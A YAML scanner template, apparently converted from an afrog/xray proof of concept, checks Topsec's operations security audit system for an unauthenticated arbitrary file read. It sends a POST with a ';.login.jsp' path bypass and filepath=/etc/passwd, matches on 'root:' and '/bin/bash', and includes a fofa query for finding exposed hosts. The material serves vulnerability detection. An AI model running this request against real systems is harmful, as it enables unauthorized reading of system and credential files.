# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: filename=1.txt&filepath=/etc/passwd
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'root:'
          - /bin/bash
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/iam/download;.login.jsp'
id: topsec-download-fileread
info:
  author: Superhero
  description: |-
    fofa: header="iam" && server="Apache-Coyote/"
    天融信运维安全审计系统 download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 天融信运维安全审计系统 download 任意文件读取漏洞
  severity: high
  tags: topsec,fileread,argus-import
